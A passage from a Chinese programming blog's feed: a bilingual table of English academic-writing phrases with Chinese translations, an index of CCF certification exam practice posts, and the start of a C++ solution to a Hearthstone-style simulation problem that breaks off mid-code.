in__ research is the idea that __</td><td align="left">几十年来，_ 研究中最流行的观点之一是  _。</td></tr><tr><td align="left">Recent theoretical developments have <strong>revealed</strong> that __</td><td align="left">最近的理论发展表明__。</td></tr><tr><td align="left">A common strategy <strong>used to study</strong> __ is to _</td><td align="left">研究__的常用策略是_。</td></tr><tr><td align="left">This research <strong>constitutes</strong> a <strong>relatively</strong> new area which has <strong>emerged from</strong> __</td><td align="left">这项研究是由__产生的一个相对较新的领域。</td></tr><tr><td align="left">These <strong>approaches</strong> have been influential in the <strong>field</strong> because of __</td><td align="left">由于__，这些方法在该领域产生了影响。</td></tr><tr><td align="left">In the past several decades, __ have <strong>played an important role in</strong> _</td><td align="left">在过去的几十年里，__在_中起了重要的作用。</td></tr><tr><td align="left">There <strong>are growing appeals for</strong> __</td><td align="left">有越来越多的人呼吁__。</td></tr><tr><td align="left">This is the field of study that <strong>deals with</strong> __</td><td align="left">这是研究__的领域。</td></tr><tr><td align="left">Most of the theories of __ are <strong>however focused on explaining</strong> _</td><td align="left">然而，大多数关于__的理论集中于解释_。</td></tr><tr><td align="left">There are three major theoretical and <strong>conceptual frameworks</strong> for __ __</td><td align="left">有三个主要的理论和概念框架用于__。</td></tr><tr><td align="left">The field has <strong>gradually broadened as</strong> __</td><td align="left">这一领域逐渐扩大为__。</td></tr><tr><td align="left">This field of study is sometimes <strong>referred as</strong> __</td><td align="left">这个研究领域有时被称为__。</td></tr><tr><td align="left">This has <strong>been widely adopted in</strong> the field of __</td><td align="left">这已被广泛采用于__领域。</td></tr><tr><td align="left">This <strong>thesis</strong> considers the field of __ as the main subject of its study.</td><td align="left">本文以__领域为主要研究对象。</td></tr><tr><td align="left">One of the major topics to be <strong>investigated</strong> in this field is __</td><td align="left">这一领域的主要研究课题之一是__。</td></tr><tr><td align="left">This field closely follows the <strong>paradigm</strong> of __</td><td align="left">这个领域紧跟__的模式。</td></tr><tr><td align="left">The field has <strong>met with great success</strong> in many problems __</td><td align="left">这个领域在许多__问题上取得了巨大的成功。</td></tr><tr><td align="left">This is not particularly new and has been used for many years in the field of _</td><td align="left">这并不是特别新，在__领域已经使用多年。</td></tr><tr><td align="left"><strong>Widely considered to be a good way to</strong> __</td><td align="left">人们普遍认为这是一个好办法。</td></tr><tr><td align="left">This <strong>phenomenon</strong> has been widely <strong>observed</strong>.</td><td align="left">这一现象已被广泛观察到。</td></tr><tr><td align="left">A common technique is to __</td><td align="left">一种常用的技术是__。</td></tr><tr><td align="left">This is a technique common in __</td><td align="left">这是__常用的一种技术。</td></tr><tr><td align="left">There are <strong>several common</strong> kinds of __</td><td align="left">有几种常见的__。</td></tr></tbody></table><h2><span id="2-wen-ti-ding-yi">2.问题定义</span></h2><table><thead><tr><th align="left">英文</th><th align="left">翻译</th></tr></thead><tbody><tr><td align="left">This <strong>seems to be</strong> a common problem in __</td><td align="left">这似乎是__的一个普遍问题。</td></tr><tr><td align="left">This <strong>leads to myriad</strong> problems in __</td><td align="left">这导致了__的无数问题。</td></tr><tr><td align="left">The main problem is that __</td><td align="left">主要的问题是__。</td></tr><tr><td align="left">There is a further problem with __</td><td align="left">关于__还有一个更深层次的问题。</td></tr><tr><td align="left">One <strong>primary</strong> problem with __ is that _</td><td align="left">关于__的一个主要问题是_。</td></tr><tr><td align="left">The methods are not without their problems as will be <strong>discussed</strong> in __</td><td align="left">这些方法并非没有问题，我们将在__中讨论这些问题。</td></tr><tr><td align="left">The foremost problems are the facts that __</td><td align="left">最重要的问题是__。</td></tr><tr><td align="left">This <strong>makes up for</strong> the problem of __</td><td align="left">这就解决了__的问题</td></tr><tr><td align="left">This seems to be a common problem in __</td><td align="left">这似乎是__的一个普遍问题。</td></tr><tr><td align="left">This is a <strong>complex</strong> problem and to <strong>simplify</strong> it requires __</td><td align="left">这是一个复杂的问题，简化它需要__。</td></tr><tr><td align="left">A challenging problem which <strong>arises</strong> in this <strong>domain</strong> is __</td><td align="left">在这一领域出现的一个具有挑战性的问题是__。</td></tr><tr><td align="left">These problems are difficult to handle __</td><td align="left">这些问题很难处理__。</td></tr><tr><td align="left">This is <strong>typically</strong> a complex problem __</td><td align="left">这通常是一个复杂的问题__。</td></tr><tr><td align="left">A well-known problem with __ is that it does not <strong>take into account</strong> the _</td><td align="left">关于__一个众所周知的问题是它没有考虑到_。</td></tr><tr><td align="left">One of the problems is that it <strong>considers only</strong> the __</td><td align="left">问题之一是它只考虑了__。</td></tr><tr><td align="left">The <strong>key problem</strong> with this technique is __</td><td align="left">这项技术的关键问题是__。</td></tr><tr><td align="left">It is usually an <strong>ill-posed problem</strong> in the case of __</td><td align="left">在__情况下，这通常是一个不适定的问题。</td></tr><tr><td align="left">This problem is well-posed and does not require to impose __</td><td align="left">这个问题是恰当的，不需要强制执行__。</td></tr><tr><td align="left">This appears as a more <strong>straightforward</strong> problem <strong>compared to</strong> the __</td><td align="left">与__相比，这似乎是一个更简单的问题。</td></tr><tr><td align="left">This turns out to be even more <strong>problematic</strong> because __</td><td align="left">这就更有问题了，因为__。</td></tr><tr><td align="left">The problem with such an <strong>implementation</strong> is that __</td><td align="left">这种实现的问题是__。</td></tr><tr><td align="left">This <strong>poses</strong> some problems when carrying out the __</td><td align="left">这在执行__时提出了一些问题。</td></tr><tr><td align="left">This problem has <strong>attracted more attention</strong> in the field of __</td><td align="left">这个问题在__领域引起了广泛关注。</td></tr><tr><td align="left">This is a basic <strong>chicken-and-egg problem</strong> because __</td><td align="left">这是一个鸡生蛋还是蛋生鸡的基本问题，因为__。</td></tr><tr><td align="left"><strong>Unfortunately</strong>, this approach results in problems <strong>reated to</strong> _</td><td align="left">不幸的是，这种方法导致了与__有关的问题。</td></tr><tr><td align="left">These constraints make the problem difficult to __</td><td align="left">这些限制使问题难以解决__。</td></tr><tr><td align="left">Most of the research in this field <strong>is aimed at</strong> solving this problem.</td><td align="left">这个领域的大多数研究都是为了解决这个问题。</td></tr><tr><td align="left">This <strong>remains</strong> an open problem in the area.</td><td align="left">这在该地区仍然是一个悬而未决的问题。</td></tr><tr><td align="left">This problem has received <strong>substantial</strong> interest.</td><td align="left">这个问题引起了极大的兴趣。</td></tr><tr><td align="left">These examples <strong>highlight</strong> the problem that __</td><td align="left">这些例子突出了__的问题。</td></tr><tr><td align="left">The main <strong>practical</strong> problem that <strong>confronts</strong> us is __</td><td align="left">我们面临的主要实际问题是__。</td></tr><tr><td align="left">## 3.研究现状</td><td align="left"></td></tr><tr><td align="left">英文</td><td align="left">翻译</td></tr><tr><td align="left">:–</td><td align="left">:–</td></tr><tr><td align="left">There is no <strong>previous research</strong> using __ approach.</td><td align="left">之前没有使用__方法的研究。</td></tr><tr><td align="left"><strong>As far as we know</strong>, no previous research has investigated __</td><td align="left">据我们所知，以前没有研究过__。</td></tr><tr><td align="left">There has been <strong>less previous evidence for</strong> __</td><td align="left">之前关于__的证据较少。</td></tr><tr><td align="left">Other studies have failed to __</td><td align="left">其他的研究未能证实__。</td></tr><tr><td align="left">To our knowledge, no study has <strong>yielded</strong> __</td><td align="left">据我们所知，没有一项研究取得了__成果。</td></tr><tr><td align="left"><strong>No study to date has examined</strong> __</td><td align="left">到目前为止，还没有研究考察过__。</td></tr><tr><td align="left"><strong>Only a few studies have shown</strong> __</td><td align="left">只有少数研究表明__。</td></tr><tr><td align="left">However, __ has <strong>rarely</strong> been studied <strong>directly</strong>.</td><td align="left">然而，__很少被直接研究。</td></tr><tr><td align="left">Moreover, few studies have <strong>focussed on</strong> __</td><td align="left">此外，很少有研究关注__。</td></tr><tr><td align="left">In particular no study, to our knowledge, has considered __</td><td align="left">据我们所知，没有一项研究认为__。</td></tr></tbody></table><h2><span id="4-wen-ti-jie-jue-fang-an">4.问题解决方案</span></h2><table><thead><tr><th align="left">英文</th><th align="left">翻译</th></tr></thead><tbody><tr><td align="left">One way to <strong>overcome</strong> these problems is to __</td><td align="left">克服这些问题的一个方法是__。</td></tr><tr><td align="left">There are many <strong>alternative</strong> methods <strong>are available for</strong> solving these problems.</td><td align="left">有许多可供选择的方法来解决这些问题。</td></tr><tr><td align="left"><strong>In order to</strong> <strong>rectify</strong> the problem of __</td><td align="left">为了纠正__的问题。</td></tr><tr><td align="left">A solution to this problem is proposed in __</td><td align="left">解决这个问题的办法是__。</td></tr><tr><td align="left">One approach to solve this problem involves the use of __</td><td align="left">解决这个问题的方法之一是使用__。</td></tr><tr><td align="left">An <strong>alternative approach</strong> to the problem is __</td><td align="left">解决这个问题的另一种方法是__。</td></tr><tr><td align="left">This can be applied to solve these problems.</td><td align="left">这个可以用来解决这些问题。</td></tr><tr><td align="left">A number of works have shown that this problem can be overcome by using __</td><td align="left">大量研究表明，使用__可以克服这一问题。</td></tr><tr><td align="left">A large number of alternative approaches have been developed over the last few decades to__</td><td align="left">在过去的几十年里，人们开发了大量的替代方法来支持__。</td></tr><tr><td align="left">To overcome this problem, in the <strong>next section</strong> we demonstrate __</td><td align="left">为了克服这个问题，在下一节我们将演示__。</td></tr><tr><td align="left">One way to overcome this problem is to __</td><td align="left">解决这个问题的一个办法是__。</td></tr><tr><td align="left">To overcome this problem, some approaches have been made __</td><td align="left">为了克服这个问题，已经采取了一些措施__。</td></tr><tr><td align="left">One way of <strong>recovering from</strong> this problem could be to __</td><td align="left">从这个问题中恢复的一个方法是__。</td></tr><tr><td align="left">This has been proposed to <strong>surmount</strong> the problems caused by __</td><td align="left">这是为了克服由__引起的问题。</td></tr><tr><td align="left">A different approach to the <strong>traditional</strong> problem <strong>is given in</strong> __</td><td align="left">对于传统问题，__给出了一种不同的处理方法。</td></tr><tr><td align="left">A whole range of different approaches to the problem are available.</td><td align="left">有许多不同的方法可以解决这个问题。</td></tr><tr><td align="left">These techniques have potential to solve contemporary problems in __</td><td align="left">这些技术有潜力在__中解决当代问题。</td></tr><tr><td align="left">We should <strong>tailor</strong> specific solutions to specific problems __</td><td align="left">我们应该针对具体问题__制定具体的解决方案。</td></tr><tr><td align="left">The standard solution to the problem is based on __</td><td align="left">这个问题的标准解决办法是以__为基础的。</td></tr><tr><td align="left">The solution proposed here addresses only the problem of __</td><td align="left">这里提出的解决办法只解决__的问题。</td></tr><tr><td align="left">There are techniques that have been developed to solve this problem __</td><td align="left">已经开发出一些技术来解决这个问题。</td></tr><tr><td align="left">This problem is usually overcome by __</td><td align="left">这个问题通常用__来解决。</td></tr><tr><td align="left">There exist many methods for dealing with this problem __</td><td align="left">有许多方法来处理这个问题__。</td></tr><tr><td align="left"><strong>Broadly speaking</strong>, the problem can be addressed by __</td><td align="left">广义地说，这个问题可以用__来解决。</td></tr><tr><td align="left">One of the simplest ways of <strong>tackling</strong> this problem is __</td><td align="left">解决这个问题最简单的方法之一是__。</td></tr><tr><td align="left">This problem has been largely studied and many <strong>viable</strong> solutions have been found.</td><td align="left">这个问题已经进行了大量的研究，并找到了许多可行的解决方案。</td></tr><tr><td align="left">In general, this problem can be <strong>tackled</strong> in two different ways.</td><td align="left">一般来说，这个问题可以用两种不同的方法来解决。</td></tr><tr><td align="left">Other approaches have been shown to cope with the problem more efficiently.</td><td align="left">已经证明其他方法可以更有效地处理这个问题。</td></tr><tr><td align="left">We will review the main approaches to solve this problem.</td><td align="left">我们将回顾解决这个问题的主要途径。</td></tr><tr><td align="left">Recently, a more general solution has been proposed for this problem.</td><td align="left">最近，针对这个问题提出了一个更普遍的解决方案。</td></tr><tr><td align="left">Both these works provide a solution to the problem.</td><td align="left">这两项工作都为这个问题提供了解决方案。</td></tr><tr><td align="left">Recent methods <strong>focus on</strong> overcoming the problems by proposing different schemes for __</td><td align="left">最近的方法侧重于通过提出不同的__方案来克服这些问题。</td></tr><tr><td align="left">This strategy is not uncommon in this kind of problems.</td><td align="left">这种策略在这类问题中并不少见。</td></tr><tr><td align="left">We can apply our algorithm to solve this difficult problem.</td><td align="left">我们可以用我们的算法来解决这个难题。</td></tr><tr><td align="left">We have developed this generic method to solve <strong>a variety of</strong> problems.</td><td align="left">我们开发了这种通用方法来解决各种问题。</td></tr><tr><td align="left">We will now demonstrate our method on some specific problems.</td><td align="left">现在我们将在一些具体问题上演示我们的方法。</td></tr><tr><td align="left">Here we solve several problems <strong>simultaneously</strong>.</td><td align="left">这里我们同时解决几个问题。</td></tr><tr><td align="left">A possible solution to the problem at hand is __</td><td align="left">解决当前问题的一个可能的办法是__。</td></tr><tr><td align="left">It is clear that the problem could be easily <strong>tackled</strong> by __</td><td align="left">很明显，这个问题很容易用__来解决。</td></tr></tbody></table><h2><span id="5-yan-jiu-dong-ji">5.研究动机</span></h2><table><thead><tr><th align="left">英文</th><th align="left">翻译</th></tr></thead><tbody><tr><td align="left">It is of interest to know whether __still <strong>hold</strong> true.</td><td align="left">知道__是否仍然正确是很重要的。</td></tr><tr><td align="left">It would be of special interest to__</td><td align="left">它对__有特殊的意义。</td></tr><tr><td align="left">We therefore analyzed __ and investigated whether _</td><td align="left">因此，我们分析了__并调查了是否_。</td></tr><tr><td align="left">For this study, it was of interest to investigate __</td><td align="left">在这项研究中，对__进行调查是有意义的。</td></tr><tr><td align="left">We investigated whether __ can be partly explained by _</td><td align="left">我们研究了是否能用__来部分解释_。</td></tr><tr><td align="left">To examine the impact of __, we tested _</td><td align="left">为了检验__的影响，我们测试了_。</td></tr><tr><td align="left">We have investigated the effect of __</td><td align="left">我们已经调查了__的影响。</td></tr><tr><td align="left">We <strong>characterize</strong> different aspects of __</td><td align="left">我们描述了__的不同方面。</td></tr><tr><td align="left">One way to investigate __ was to _</td><td align="left">调查__的一种方法是_。</td></tr><tr><td align="left">A new approach is therefore needed for __</td><td align="left">因此，__需要一种新的方法。</td></tr><tr><td align="left">To <strong>illuminate</strong> this <strong>uncharted</strong> area, we examined __</td><td align="left">为了阐明这个未知的领域，我们考察了__。</td></tr><tr><td align="left">## 6.研究目标</td><td align="left"></td></tr><tr><td align="left">英文</td><td align="left">翻译</td></tr><tr><td align="left">:–</td><td align="left">:–</td></tr><tr><td align="left">The aim is to develop more <strong>sophisticated</strong> methods for __</td><td align="left">其目的是为__开发更复杂的方法。</td></tr><tr><td align="left">The aim of this work is to develop __</td><td align="left">这项工作的目的是开发__。</td></tr><tr><td align="left">The aims in this chapter are <strong>twofold</strong>: First __, Second _</td><td align="left">本章的目的有两个:第一阶段__，第二阶段_。</td></tr><tr><td align="left">For our first goal, we focus on two problems __</td><td align="left">对于我们的第一个目标，我们关注两个问题__。</td></tr><tr><td align="left">The aim here is to investigate __</td><td align="left">这里的目的是调查__。</td></tr><tr><td align="left">The overall goal of this work was to __</td><td align="left">这项工作的总目标是__。</td></tr><tr><td align="left">This project aims to develop an <strong>overarching framework</strong> to __</td><td align="left">该项目旨在为__开发一个总体框架。</td></tr><tr><td align="left">The aim of the experiment is to compare __</td><td align="left">实验的目的是比较__。</td></tr><tr><td align="left">The <strong>ultimate</strong> goal is to produce a __</td><td align="left">最终目标是产生__。</td></tr><tr><td align="left">The overall goal of this thesis was to <strong>pursue</strong> __</td><td align="left">本文的总体目标是追求__。</td></tr><tr><td align="left">After defining the problem we explain the goals of the thesis.</td><td align="left">在定义了问题之后，我们解释了论文的目标。</td></tr><tr><td align="left">With this aim in mind, in this paper we <strong>present</strong> a new method for __</td><td align="left">基于这一目的，我们在本文中提出了一种研究__的新方法。</td></tr><tr><td align="left">Our research aims at finding a solution for this challenging problem of__</td><td align="left">我们的研究旨在找到解决__挑战性问题的办法。</td></tr><tr><td align="left">We examine some previous work and propose a new method for __</td><td align="left">我们研究了以前的一些工作，并提出了一种解决__的新方法。</td></tr><tr><td align="left">There are too many <strong>simultaneous</strong> goals making it difficult to __</td><td align="left">同时有太多的目标，很难达成__。</td></tr><tr><td align="left">One of the major aims of this work was to create __</td><td align="left">这项工作的主要目的之一是建立__。</td></tr><tr><td align="left">The main objective is to investigate methods for improving __</td><td align="left">主要目的是研究改进__的方法。</td></tr><tr><td align="left">The objective is to devise and implement a system for __</td><td align="left">目标是为__制定和实施一项制度。</td></tr><tr><td align="left">The objectives were partially met by developing a method to __</td><td align="left">通过开发一种方法来达到目标的一部分。</td></tr><tr><td align="left">The objective is to demonstrate the <strong>feasibility</strong> of __</td><td align="left">目的是论证__的可行性。</td></tr><tr><td align="left">One of the objectives is to improve the __</td><td align="left">其中一个目标是改进__。</td></tr><tr><td align="left">## 7.研究地意义和优势</td><td align="left"></td></tr><tr><td align="left">英文</td><td align="left">翻译</td></tr><tr><td align="left">:–</td><td align="left">:–</td></tr><tr><td align="left">This thesis documents several key contributions made to the fields of __</td><td align="left">这篇论文记录了对__领域的几项重要贡献。</td></tr><tr><td align="left">This thesis has made a number of <strong>significant</strong> contributions to the field of __</td><td align="left">这篇论文对__领域做出了许多重大贡献。</td></tr><tr><td align="left">The contributions made here have wide applicability.</td><td align="left">这里所作的贡献具有广泛的适用性。</td></tr><tr><td align="left">The contributions made should be of wide interest.</td><td align="left">所作的贡献应该引起广泛的兴趣。</td></tr><tr><td align="left">The first main contribution proposed in this field is a __</td><td align="left">在这一领域提出的第一个主要贡献是__。</td></tr><tr><td align="left">The contributions of this work are presented as follows: __</td><td align="left">本工作的贡献如下__。</td></tr><tr><td align="left">The main achievements, including contributions to the field can be summarized as follows: __</td><td align="left">主要成就包括对该领域的贡献可以总结如下:__</td></tr><tr><td align="left">We summarize the main contributions of this <strong>thesis</strong>.</td><td align="left">总结了本文的主要贡献。</td></tr><tr><td align="left">The key contribution of this work is the solution it provides __</td><td align="left">这项工作的关键贡献在于它提供了__的解决方案。</td></tr><tr><td align="left">It has numerous advantages as explained here __</td><td align="left">正如这里所解释的，它有许多优点__。</td></tr><tr><td align="left">It has significant benefits in terms of __</td><td align="left">它在__方面有显著的好处。</td></tr><tr><td align="left">There is a clear advantage in following the methods of __</td><td align="left">采用__方式有明显的好处。</td></tr><tr><td align="left">This has particular advantages over other __</td><td align="left">这比其他__有特殊的优点。</td></tr><tr><td align="left">All of these advantages make it particularly valuable in __</td><td align="left">所有这些优势使得它在__特别有价值。</td></tr><tr><td align="left">One of the primary benefits of this algorithm is __</td><td align="left">这个算法的主要优点之一是__。</td></tr><tr><td align="left">This gives a significant advantage because __</td><td align="left">这带来了一个显著的优势，因为__。</td></tr><tr><td align="left">These point out the advantages and <strong>practicability</strong> of __</td><td align="left">指出了__的优点和实用性。</td></tr><tr><td align="left">One of the key benefits of the algorithm is __</td><td align="left">该算法的主要优点之一是__。</td></tr><tr><td align="left">The main advantage compared to previous method is __</td><td align="left">与以前的方法相比，主要优点是__。</td></tr><tr><td align="left">This present some practical advantages.</td><td align="left">这提出了一些实际的优点。</td></tr><tr><td align="left">The main advantage is the simplified pattern.</td><td align="left">其主要优点是简化了模式。</td></tr><tr><td align="left">One practical advantage of the method is that it can be used in __</td><td align="left">这种方法的一个实际优点是它可以用在__。</td></tr><tr><td align="left">The advantage becomes all the more significant when __</td><td align="left">当__时，优势变得更加明显。</td></tr><tr><td align="left">In comparison with other techniques, this method has the advantage of __</td><td align="left">与其它方法相比，该方法的优点是__。</td></tr><tr><td align="left">The most important advantage of this method is that it can perform very well in __</td><td align="left">这种方法最重要的优点是它能在__中很好地发挥作用。</td></tr><tr><td align="left">It yielded significant speed advantages when __</td><td align="left">当__时，它产生了显著的速度优势。</td></tr><tr><td align="left">The benefit of using the __ is expected to _</td><td align="left">使用__的好处预计为_。</td></tr><tr><td align="left">The main advantage is that we are able to __</td><td align="left">主要的优点是我们能够__。</td></tr><tr><td align="left">To give some idea of the benefits of this method __</td><td align="left">为了说明这种方法的好处__。</td></tr><tr><td align="left">The <strong>additional advantage</strong> of using this method is that it results in __</td><td align="left">使用这种方法的另一个好处是它能产生__。</td></tr><tr><td align="left">This is an important advantage of this algorithm __</td><td align="left">这是该算法的一个重要优点__。</td></tr><tr><td align="left">These are the main advantages of this method.</td><td align="left">这些是这种方法的主要优点。</td></tr></tbody></table><p>资源来源：自动化学报<br>作者为二次加工</p>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SCI-introduction </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF2020-09月刷题汇总</title>
      <link href="/2020/09/07/ccf202009/"/>
      <url>/2020/09/07/ccf202009/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-shua-ti-bo-ke-hui-zong">CCF刷题博客汇总</span></h1><h2><span id="xie-zai-qian-mian">写在前面</span></h2><p>CCF的第二题基本都是写要用到STL容器的题目，也就是语法题，努力还是可以拿到的<br>CCF的第三题分为<br>1.大模拟题(这个没办法，只有多写才可以在现场做出来)，淦，题目看不懂就0分；<br>2.文本处理-字符串处理，这个用到find()，replace()，erase()，substr()，大概率是拿不了满分的，坑太多，但上面三个函数应该能搞30分吧，可恶，好难啊！<br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200907191435778.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="孤独呀！"></p><h2><span id="hui-zong-de-ti-mu">汇总的题目</span></h2><p><a href="https://kamenrider41.gitee.io/2020/09/03/xiaoshukongzhi/" target="_blank" rel="noopener">C++中的小数位数控制和有效数字控制</a></p><p><a href="https://kamenrider41.gitee.io/2020/09/03/minglinghangxuanxiang/" target="_blank" rel="noopener">CCF命令行选项—初识sstream和getline()</a></p><p><a href="https://kamenrider41.gitee.io/2020/09/03/huishouzhanxuanzhi/" target="_blank" rel="noopener">CCF回收站选址—map与结构体的结合使用+复习STL-map</a></p><p><a href="https://kamenrider41.gitee.io/2020/09/03/xueshengpaidui/" target="_blank" rel="noopener">CCF学生排队—复习STL-vector，vector增删真的方便</a></p><p><a href="https://kamenrider41.gitee.io/2020/09/04/zifuchuanpipei/" target="_blank" rel="noopener">CCF字符串匹配—String::find()&amp;&amp; tolower() </a></p><p><a href="https://kamenrider41.gitee.io/2020/09/04/gonggongyaoshihe/" target="_blank" rel="noopener">CCF公共钥匙盒—优先队列真的很棒！</a></p><p><a href="https://kamenrider41.gitee.io/2020/09/04/xiaomingfangxue/" target="_blank" rel="noopener">CCF小明放学—震惊，小明放学竟用一维数学模型解决！</a></p><p><a href="https://kamenrider41.gitee.io/2020/09/04/pengzhuangdexiaoqiu/" target="_blank" rel="noopener">CCF碰撞的小球—我的小球碰撞不反弹，你怕不怕？</a></p><p><a href="https://kamenrider41.gitee.io/2020/09/05/jihejingjia/" target="_blank" rel="noopener">CCF集合竞价—STL-set&amp;&amp;STL-vector&amp;&amp;sort()</a></p><p><a href="https://kamenrider41.gitee.io/2020/09/05/jieri/" target="_blank" rel="noopener">CCF节日—注意当月第一天超过目标星期的情况</a></p><p><a href="https://kamenrider41.gitee.io/2020/09/05/mobanshengchengxitong/" target="_blank" rel="noopener">CCF模板生成系统—字符串都有替身了，木大木大木大！</a></p><p><a href="https://kamenrider41.gitee.io/2020/09/05/huatu/" target="_blank" rel="noopener">CCF画图—一个平平无奇的搜索题bfs</a></p><p><a href="https://kamenrider41.gitee.io/2020/09/05/lujingjiexi/" target="_blank" rel="noopener">CCF路径解析—String::find()&amp;&amp;erase()</a></p><p><a href="https://kamenrider41.gitee.io/2020/09/06/markdown/" target="_blank" rel="noopener">CCFMarkdown—用到了状态机的思想</a></p><p><a href="https://kamenrider41.gitee.io/2020/09/06/quanxianchaxun/" target="_blank" rel="noopener">CCF权限查询—解释一下什么是“大力出奇迹”</a></p><p><a href="https://kamenrider41.gitee.io/2020/09/06/lushichuangshuo/" target="_blank" rel="noopener">CCF炉石传说—谁说玩游戏对学习没帮助的？</a></p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF炉石传说---谁说玩游戏对学习没帮助的？</title>
      <link href="/2020/09/06/lushichuangshuo/"/>
      <url>/2020/09/06/lushichuangshuo/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201609-3">CCF-201609-3</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906121159146.GIF#pic_center" alt="下面都不会了"></p><h2><span id="wo-men-xian-lai-kan-yi-xia-ti-mu">我们先来看一下题目</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906121318377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/2020090612132830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="2"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906121336645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="3"></p><h3><span id="jie-ti-si-lu">解题思路</span></h3><p>大模拟题，他怎么说就怎么写<br>不理解题意的自己去搓两把炉石传说就懂了！<br>存储随从用vector，这个增删随从方便呀！</p><h3><span id="dai-ma">代码</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstring></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">struct</span> node<span class="token punctuation">{</span>    <span class="token keyword">int</span> attack<span class="token punctuation">;</span>    <span class="token keyword">int</span> blood<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>node<span class="token operator">></span> a<span class="token punctuation">,</span>b<span class="token punctuation">;</span><span class="token keyword">int</span> A<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>B<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">;</span><span class="token keyword">int</span> turn<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      string order<span class="token punctuation">;</span>      cin<span class="token operator">>></span>order<span class="token punctuation">;</span>      node t<span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">int</span> pos<span class="token punctuation">;</span>          cin<span class="token operator">>></span>pos<span class="token operator">>></span>t<span class="token punctuation">.</span>attack<span class="token operator">>></span>t<span class="token punctuation">.</span>blood<span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>turn<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>pos<span class="token operator">></span>a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> a<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> a<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>pos<span class="token number">-1</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>pos<span class="token operator">></span>b<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> b<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> b<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>pos<span class="token number">-1</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">int</span> attacker<span class="token 